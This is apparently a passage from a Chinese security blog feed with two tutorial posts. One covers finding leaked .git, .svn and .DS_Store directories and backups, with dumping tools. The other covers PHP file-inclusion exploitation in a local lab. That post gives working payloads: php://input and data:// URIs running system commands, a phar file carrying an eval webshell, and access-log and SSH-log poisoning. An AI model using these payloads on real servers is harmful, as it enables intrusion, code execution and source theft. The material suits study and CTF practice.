        <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.xmanblog.net/2017/04/03/web-code-leakage/" target="_blank" rel="noopener">https://www.xmanblog.net/2017/04/03/web-code-leakage/</a></p><h2 id="寻找源代码备份"><a href="#寻找源代码备份" class="headerlink" title="寻找源代码备份"></a>寻找源代码备份</h2><blockquote><p>在打ctf的时候,有时候页面什么提示都没有,这时候就要考虑一下是不是源代码泄露了</p></blockquote><h3 id="hg-源码泄露"><a href="#hg-源码泄露" class="headerlink" title="hg 源码泄露"></a>hg 源码泄露</h3><p><code>hg init</code> 时会产生 <code>.hg</code> 文件。</p><pre><code># 可以通过以下链接访问http://www.example.com/.hg/</code></pre><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">利用工具 dvcs-ripper</a></p><pre><code>rip-hg.pl -v -u http://www.example.com/.hg/</code></pre><a id="more"></a><h3 id="Git-源码泄露"><a href="#Git-源码泄露" class="headerlink" title="Git 源码泄露"></a>Git 源码泄露</h3><p>在运行<code>git init</code>初始化代码库的时候，会在当前目录下面产生一个<code>.git</code>的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，如果<code>.git</code>这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><pre><code># 可以通过以下链接访问http://www.example.com/.githttp://www.example.com/.git/HEADhttp://www.example.com/.git/indexhttp://www.example.com/.git/confighttp://www.example.com/.git/description</code></pre><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p><pre><code>python GitHack.py http://www.example.com/.git/</code></pre></li><li><p><a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">GitHacker（可恢复完整 Git 仓库）</a></p><pre><code>python GitHacker.py http://www.example.com/.git/</code></pre></li><li><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><pre><code>rip-git.pl -v -u http://www.example.com/.git/</code></pre></li></ul><h3 id="DS-Store-文件泄露"><a href="#DS-Store-文件泄露" class="headerlink" title=".DS_Store 文件泄露"></a>.DS_Store 文件泄露</h3><p>Mac OS 中会包含有 <code>.DS_Store</code> 文件，在发布代码时未删除文件夹中隐藏的<code>.DS_store</code>，被发现后，获取了敏感的文件名等信息.</p><pre><code># 可通过以下链接访问http://www.example.com/.ds_store</code></pre><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds＿store＿exp</a></p><pre><code>python ds_store_exp.py http://www.example.com/.ds_store</code></pre><h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。<strong>当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时</strong>，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p>常见的后缀名：</p><pre><code>.rar.zip.7z.tar.tar.gz.bak.txt.swp.html</code></pre><h3 id="SVN-泄露"><a href="#SVN-泄露" class="headerlink" title="SVN 泄露"></a>SVN 泄露</h3><p><code>Subversion，简称SVN</code>，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p><p>Subversion使用<code>服务端—客户端</code>的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。<strong>这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作</strong>。</p><pre><code># 可通过以下链接访问http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</code></pre><p>敏感文件：</p><pre><code>/.svn/.svn/wc.db/.svn/entries</code></pre><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a><pre><code>perl rip-svn.pl -v -u http://www.example.com/.svn/</code></pre></li><li><a href="http://tools.40huo.cn/#!web.md#%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2" target="_blank" rel="noopener">Seay - SVN</a></li></ul><h3 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF / web.xml 泄露"></a>WEB-INF / web.xml 泄露</h3><p>WEB-INF 是 Java Web 应用的安全目录，如果想在页面中直接访问其中的文件，必须通过<code>web.xml</code>文件对要访问的文件进行<code>相应映射</code>才能访问。</p><p>WEB-INF 主要包含一下文件或目录：</p><ul><li>/WEB-INF/web.xml ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li>/WEB-INF/classes/ ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在.jar 文件中。</li><li>/WEB-INF/lib/ ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。</li><li>/WEB-INF/src/ ：源码目录，按照包名结构放置各个 java 文件。</li><li>/WEB-INF/database.properties ：数据库配置文件。</li></ul><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><h4 id="漏洞检测及利用方法"><a href="#漏洞检测及利用方法" class="headerlink" title="漏洞检测及利用方法"></a>漏洞检测及利用方法</h4><p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：</p><pre><code>location ~ ^/WEB-INF/* { deny all; } # 或者return 404; 或者其他！</code></pre><h3 id="CVS-泄露"><a href="#CVS-泄露" class="headerlink" title="CVS 泄露"></a>CVS 泄露</h3><pre><code>http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构</code></pre><p>取回源码的命令</p><pre><code>bk clone http://url/name dir</code></pre><p>这个命令的意思就是把远端一个名为<code>name</code>的<code>repo</code> clone到本地名为<code>dir</code>的目录下。</p><p>查看所有的改变的命令，转到download的目录</p><pre><code>bk changes</code></pre><h3 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h3><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ropper</a></p><pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre><h4 id="工具推荐"><a href="#工具推荐" class="headerlink" title="工具推荐"></a>工具推荐</h4><ul><li><a href="http://www.bitkeeper.com/installation.instructions" target="_blank" rel="noopener">Bitkeeper</a></li><li><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">weakfilescan</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web源码泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含总结</title>
      <link href="/2019/03/11/wen-jian-bao-han-zong-jie/"/>
      <url>/2019/03/11/wen-jian-bao-han-zong-jie/</url>
      
        <content type="html"><![CDATA[<blockquote><p>实验环境：phpstudy，在<code>D:\phpStudy\PHPTutorial\WWW\</code>目录下新建<code>fileinclude</code>,然后新建<code>index.php</code>,内容如下</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><a id="more"></a><h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>php中引发文件包含漏洞的通常是以下四个函数：</p><ol><li><code>include()</code></li><li><code>include_once()</code></li><li><code>require()</code></li><li><code>require_once()</code></li></ol><ul><li><code>reuqire()</code> 如果在包含的过程中有错，比如文件不存在等，则<strong>会直接退出，不执行后续语句</strong>。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.tlrmjrqif8a_1536892289" alt></p><ul><li><code>include()</code> 如果出错的话，只<strong>会提出警告，会继续执行后续语句</strong>。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.47cclxfvyy6_1536892320" alt></p><ul><li><code>require_once()</code> 和 <code>include_once()</code> 功能与<code>require()</code> 和 <code>include()</code> 类似。不同的是，<strong>如果一个文件已经被包含过了，则 <code>require_once()</code> 和 <code>include_once()</code> 则不会再包含它</strong>，以避免函数重定义或变量重赋值等问题。</li><li>当利用这四个函数来包含文件时，<strong>不管文件是什么类型（图片、txt等等），只要文件内容符合PHP语法规范，都会直接作为php文件进行解析，而包含非PHP语法规范源文件时，则会暴露其源代码</strong>。测试代码放在<code>fileinclude</code>目录下<code>index.php</code>：</li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>在同目录下新建<code>phpinfo.txt</code>，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>。则只需要访问：</p><pre><code>http://localhost/fileinclude/index.php?file=phpinfo.txt</code></pre><p>即可成功解析<code>phpinfo</code>。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.dimdq6z1jz_1536892336" alt></p><h3 id="文件包含漏洞场景"><a href="#文件包含漏洞场景" class="headerlink" title="文件包含漏洞场景"></a>文件包含漏洞场景</h3><ol><li>具有相关的文件包含函数。</li><li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li><li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h4><code>本地文件包含漏洞</code>，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</li></ol><h4 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h4><p><code>远程文件包含漏洞</code>。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要<code>php.ini</code>中进行配置</p><pre><code>allow_url_fopen = Onallow_url_include = On</code></pre><p>两个配置选项均需要为<code>On</code>，才能远程包含文件成功。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.4qlqcq95qn7_1536892375" alt></p><p>在<code>php.in</code>i中，<code>allow_url_fopen</code>默认一直是<code>On</code>，而<code>allow_url_include</code>从php5.2之后就默认为<code>Off</code>。</p><h2 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h2><p>下面例子中测试代码均为：<code>index.php</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><code>allow_url_fopen</code> 默认为 <code>On</code><br><code>allow_url_include</code> 默认为<code>Off</code></p><p>若有特殊要求，会在利用条件里指出</p><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><code>php://input</code></h4><h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><p>用来接收<code>POST</code>数据。我们能够通过input把我们的语句输入上去然后执行。</p><h5 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h5><pre><code>php &lt;5.0 ，allow_url_include=Off 情况下也可以用php &gt; 5.0，只有在allow_url_fopen=On 时才能使用</code></pre><p>对<code>allow_url_fopen</code>不做要求。</p><h5 id="姿势1：增加一句话"><a href="#姿势1：增加一句话" class="headerlink" title="姿势1：增加一句话"></a>姿势1：增加一句话</h5><blockquote><p>shell.php文件中只有“123456”</p></blockquote><p>URL:</p><pre><code>http://localhost/fileinclude/index.php?file=php://input</code></pre><p>POST:(这里利用<code>hackbar</code>)</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">)</span> <span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.5sh6ok33qg_1536892409" alt></p><p>结果将在<code>index.php</code>所在文件下的文件<code>shell.php</code>内增加”<code>&lt;?php phpinfo();?&gt;</code>“一句话。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.vs835cfhsj_1536892416" alt></p><h5 id="姿势2：增加文件"><a href="#姿势2：增加文件" class="headerlink" title="姿势2：增加文件"></a>姿势2：增加文件</h5><p>URL</p><pre><code>http://localhost/fileinclude/index.php?file=php://input</code></pre><p>POST:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"oneword.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">)</span> <span class="token delimiter">?></span></code></pre><p>这里fopen参数为w，可新建一个文件。即在当前目录新建<code>oneword.php</code>文件,内容为<code>&lt;?php phpinfo();?&gt;</code></p><h5 id="姿势3：执行系统命令"><a href="#姿势3：执行系统命令" class="headerlink" title="姿势3：执行系统命令"></a>姿势3：执行系统命令</h5><p>URL：</p><pre><code>http://localhost/fileinclude/index.php?file=php://input</code></pre><p>POST:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ipconfig'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.sbxz1c0v1vl_1536892441" alt></p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h4><h5 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h5><p>这个语句用来查看源码。<strong>直接包含php文件时会被解析，不能看到源码</strong>,所以用filter来读取,通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码即可得到源码。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p><h5 id="利用条件：无甚"><a href="#利用条件：无甚" class="headerlink" title="利用条件：无甚"></a>利用条件：无甚</h5><h5 id="姿势："><a href="#姿势：" class="headerlink" title="姿势："></a>姿势：</h5><pre><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.gpbfsvf1hn6_1536892449" alt></p><h6 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势:"></a>其他姿势:</h6><pre><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></pre><p>效果跟前面一样，少了<code>read</code>等关键字。在绕过一些waf时也许有用。</p><h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><code>phar://</code></h4><h5 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h5><p>phar是一个文件归档的包，类似于Java中的Jar文件，方便了PHP模块的迁移。php中默认安装了这个模块。</p><p>比如上传的文件名遭到了限制，我们无法上传php的文件，但是却只能包含php文件的时候（包含文件后缀名被限制 <code>include ‘$file’.’.php’</code>），我们就可以通过上传phar文件，再利用php伪协议来包含。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h5><p>php版本大于等于php5.3.0</p><h5 id="姿势：-1"><a href="#姿势：-1" class="headerlink" title="姿势："></a>姿势：</h5><h6 id="创建一个phar文件"><a href="#创建一个phar文件" class="headerlink" title="创建一个phar文件"></a>创建一个phar文件</h6><p>在创建phar文件的时候要注意<code>phar.readonly</code>这个参数要为<code>off</code>，否则phar文件不可写</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">phar</span><span class="token punctuation">(</span><span class="token string">"shell.phar"</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token string">"shell.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">[</span><span class="token string">'shell.php'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'&lt;?php phpinfo(); @eval($_POST[x])?>'</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php Phar::mapPhar('shell.phar'); __HALT_COMPILER?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>运行以上代码后会在当前目录下生成一个名为<code>shell.phar</code>的文件，这个文件可以被<code>include</code>，<code>file_get_contents</code>等函数利用</p><h6 id="利用phar"><a href="#利用phar" class="headerlink" title="利用phar"></a>利用phar</h6><p>利用phar文件的方法很简单，利用phar特定的格式就可以加以利用</p><pre><code>&lt;?phpinclude &#39;phar://shell.phar/shell.php&#39;;?&gt;</code></pre><p>这样就可以成功把<code>shell</code>包含进来。当我们把<code>shell.phar</code>文件重命名为<code>shell.aaa</code>等一些无效的后缀名时，一样可以使用，说明了<strong>phar文件不受文件格式的影响</strong></p><p>指定<strong>绝对路径</strong></p><pre><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/shell.phar/shell.php</code></pre><p>或者<strong>使用相对路径</strong>（这里test.zip就在当前目录下）</p><pre><code>index.php?file=phar://shell.phar/shell.php</code></pre><h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><code>zip://</code></h4><h5 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h5><p>php版本大于等于php5.3.0</p><h5 id="姿势：-2"><a href="#姿势：-2" class="headerlink" title="姿势："></a>姿势：</h5><p>首先我们<strong>新建一个zip文件，里面压缩着一个php脚本(可以为php和jpg后缀)</strong><br>假设有个文件<code>phpinfo.txt</code>，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成<code>zip</code>压缩包，如下：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.gpzgicp6mqb_1536892589" alt></p><p>但使用zip协议，<strong>需要指定<code>绝对路径</code>，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件</strong>。若是使用相对路径，则会包含失败。</p><pre><code>index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.i4lhwg58hc_1536892597" alt></p><p>####<br><code>data:URI schema</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310115711.png" alt></p><h5 id="说明-2"><a href="#说明-2" class="headerlink" title="说明"></a>说明</h5><p>这是一种数据流封装器，<code>data:URI schema</code>(URL schema可以是很多形式)</p><p>利用<code>data://</code>伪协议进行代码执行的思路原理和<code>php://</code>是类似的，都是利用了PHP中的流的概念，<strong>将原本的include的文件流重定向到了用户可控制的输入流中</strong></p><h5 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h5><ul><li>php版本大于等于php5.2</li><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ul><h5 id="姿势一："><a href="#姿势一：" class="headerlink" title="姿势一："></a>姿势一：</h5><pre><code>index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.nh3ihn1zzgl_1536892608" alt></p><h6 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h6><pre><code>index.php?file=data:text/plain,&lt;?php system(&#39;whoami&#39;);?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.1r2p6tbp1jo_1536892617" alt></p><h5 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二:"></a>姿势二:</h5><pre><code>index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.sbz7wd98hs_1536892624" alt></p><h6 id="执行命令-1"><a href="#执行命令-1" class="headerlink" title="执行命令"></a>执行命令</h6><pre><code>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code></pre><p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.ld25k1vwbhj_1536892635" alt></p><h5 id="姿势三："><a href="#姿势三：" class="headerlink" title="姿势三："></a>姿势三：</h5><pre><code>index.php?imagedata=data://image/jpeg;base64,.....</code></pre><p>（后面加上图片木马）</p><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><h4 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h4><p>session文件路径已知，且其中内容部分可控。</p><h4 id="姿势：-3"><a href="#姿势：-3" class="headerlink" title="姿势："></a>姿势：</h4><p>php的session文件的保存路径可以在<code>phpinfo</code>的<code>session.save_path</code>看到。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.ozhtg265rd7_1536892642" alt></p><p><strong>常见的php-session存放位置</strong>：</p><pre><code>/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID</code></pre><p>session的文件名格式为<code>sess_[phpsessid]</code>。而phpsessid在发送的请求的cookie字段中可以看到。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.7hphazvtxuo_1536892648" alt></p><p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p><p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce" target="_blank" rel="noopener">透過 LFI 引入 PHP session 檔案觸發 RCE</a></p><h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h4><h5 id="说明：-1"><a href="#说明：-1" class="headerlink" title="说明："></a>说明：</h5><p>当我们没有上传点，并且也没有<code>url_allow_include</code>功能时，我们就可以考虑包含服务器的日志文件</p><p>Web服务器的访问日志文件，这是一种通用的技巧。因为几乎所有网站都会将用户的访问记录到访问日志中。因此，攻击者可以向Web日志中插入PHP代码，通过文件包含漏洞来执行包含在Web日志中的PHP代码。</p><p>需要注意的是，如果网站访问量大的话，日志文件可能会非常大，这时如果包含一个这么大的文件时，PHP进程可能会卡死。一般网站通常会每天生成一个新的日志文件，因此在凌晨时进行攻击相对来说容易成功。</p><h5 id="利用条件：-4"><a href="#利用条件：-4" class="headerlink" title="利用条件："></a>利用条件：</h5><p>需要知道服务器日志的存储路径，且日志文件可读。</p><h5 id="姿势：-4"><a href="#姿势：-4" class="headerlink" title="姿势："></a>姿势：</h5><p><code>apache</code>在<strong>用户发起请求时</strong>，会将请求写入<code>access.log</code>，当<strong>发生错误时</strong>将错误写入<code>error.log</code>。攻击者使用Apache日志文件包含时，<strong>首先要确定Apache的日志路径</strong>，默认情况下，日志保存路径在 <code>/var/log/apache/access.l</code>。</p><ol><li>访问链接:<code>http://www.test.com/&lt;;?php eval(POST_[&#39;test&#39;]) ?&gt;</code></li><li>使用菜刀连接 <code>http://www.test.com/index.php?file=/var/log/apache/access.log</code></li><li>由于access的日志文件比较大，所以webshell可能会很慢甚至卡死,所以用<code>bp</code>代理截包,将包的<code>UA</code>设置为<code>&quot; &quot;</code>,使得payload进入错入日志<code>var/log/apache/error.log</code></li><li>这时候用菜刀连接<code>http://www.test.com/index.php?file=../../../../../../../../../var/log/apache/error.log</code>,因为通常它比<code>acess.log</code>体积小点,所以webshell没有那么卡!!~<blockquote><p>tips:但如果是直接发起请求，会导致<strong>一些符号(如：&lt;,&gt;,空格)被编码使得包含无法正确解析。可以使用<code>bp</code>代理截包后,在bp上修改,然后再发出去</strong>。</p></blockquote></li></ol><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.xtpwhfb5j0b_1536892658" alt></p><p>如下图可以看到,正常的php代码已经写入了 <code>/var/log/apache2/access.log</code>。然后进行包含即可。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.imxn9l6ybw_1536892664" alt></p><p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p><h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><h5 id="利用条件：-5"><a href="#利用条件：-5" class="headerlink" title="利用条件："></a>利用条件：</h5><ol><li>如果服务器开启了<code>ssh</code>,且我们使用的是默认ssh端口<code>22</code>,或者我们知道服务器使用什么端口</li><li>需要知道<code>ssh-log</code>的位置，且可读。默认情况下为 <code>/var/log/auth.log</code></li></ol><h5 id="姿势：-5"><a href="#姿势：-5" class="headerlink" title="姿势："></a>姿势：</h5><p>用<code>ssh</code>或<code>putty</code>连接,<code>&lt;?php eval(POST_[&#39;test&#39;]) ?&gt;</code>作为<code>用户名</code>：</p><pre><code>ssh &#39;&lt;?php eval(POST_[&#39;test&#39;]) ?&gt;&#39;@remotehost</code></pre><p>之后会提示输入密码等等，随便输入,这时肯定会登录失败,<strong>用户名</strong>(<code>&lt;?php eval(POST_[&#39;test&#39;]) ?&gt;</code>)会被记录在ssh的失败登入日志<code>ssh-log</code>上。即在<code>remotehost</code>的<code>ssh-log</code>中即可写入<strong>php代码</strong>：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.glirmkmnxh_1536892672" alt></p><p>之后进行文件包含即可(菜刀连接)。<br>参考:<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="noopener">RCE with LFI and SSH Log Poisoning</a></p><h3 id="包含environ环境变量"><a href="#包含environ环境变量" class="headerlink" title="包含environ环境变量"></a>包含environ环境变量</h3><h4 id="利用条件：-6"><a href="#利用条件：-6" class="headerlink" title="利用条件："></a>利用条件：</h4><ol><li>php以<code>cgi</code>方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ol><h4 id="姿势：-6"><a href="#姿势：-6" class="headerlink" title="姿势："></a>姿势：</h4><p><code>proc/self/environ</code>中会保存<code>user-agent</code>头。如果在<code>user-agent</code>中插入<code>php代码</code>，然后访问Web服务器,则<code>php代码</code>会被写入到<code>environ</code>中。之后再包含该文件获取webshell。下面是该文件的内容</p><pre><code>DOCUMENT_ROOT=/home/sirgod/public_html GATEWAY_INTERFACE=CGI/1.1 HTTP_ACCEPT=text/html, application/xml;q=0.9, application/xhtml+xml,image/png, image/jpeg, image/gif, 